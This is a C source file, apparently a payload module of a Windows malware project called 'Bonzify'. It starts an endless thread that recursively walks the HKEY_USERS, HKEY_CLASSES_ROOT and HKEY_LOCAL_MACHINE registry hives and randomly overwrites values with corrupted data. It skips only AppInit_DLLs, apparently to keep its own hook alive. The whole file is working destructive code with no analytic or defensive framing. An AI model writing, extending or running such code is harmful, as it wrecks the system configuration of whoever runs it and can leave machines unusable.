#include <Windows.h>

#include "../Bonzify/Utils.h"
#include "Payloads.h"

static void CorruptRegistry(HKEY key, DWORD chance);

DWORD WINAPI CorruptRegistryThread(LPVOID parameter) {
	const DWORD chance = 500;

	for (;;) {
		CorruptRegistry(HKEY_USERS, (DWORD)(chance * 0.3));
		CorruptRegistry(HKEY_CLASSES_ROOT, (DWORD)(chance * 1.2));
		CorruptRegistry(HKEY_LOCAL_MACHINE, (DWORD)(chance * 5.0));
	}
}

#define BUFFER_SIZE 8192

static void CorruptRegistry(HKEY key, DWORD chance) {
	LSTATUS result;

	DWORD nameSize = MAX_PATH;
	LPTSTR name = (LPTSTR)LocalAlloc(0, nameSize * sizeof(TCHAR));

	nameSize = MAX_PATH;
	result = RegEnumKeyEx(key, 0, name, &nameSize, NULL, NULL, NULL, NULL);
	for (int i = 1; result != ERROR_NO_MORE_ITEMS; i++) {
		HKEY newKey;
		if (RegOpenKeyEx(key, name, 0, KEY_READ | KEY_WRITE, &newKey) == ERROR_SUCCESS) {
			CorruptRegistry(newKey, chance);
		}

		nameSize = MAX_PATH;
		result = RegEnumKeyEx(key, i, name, &nameSize, NULL, NULL, NULL, NULL);
	}

	DWORD dataSize = BUFFER_SIZE, type = 0;
	BYTE *data = (BYTE*)LocalAlloc(0, dataSize);

	nameSize = MAX_PATH;
	result = RegEnumValue(key, 0, name, &nameSize, NULL, &type, data, &dataSize);
	for (int i = 1; result != ERROR_NO_MORE_ITEMS; i++) {
		if (random() % chance == 0 && result == ERROR_SUCCESS && !endsWith(name, TEXT("AppInit_DLLs"))) {
			CorruptMemory(data, dataSize, chance);

			result = RegSetValueEx(key, name, NULL, type, data, dataSize);

			if (result == ERROR_SUCCESS) {
				Sleep(50);
			}
		}

		dataSize = BUFFER_SIZE; nameSize = MAX_PATH;
		result = RegEnumValue(key, i, name, &nameSize, NULL, &type, data, &dataSize);
	}

	LocalFree(name);
	LocalFree(data);
	RegCloseKey(key);
}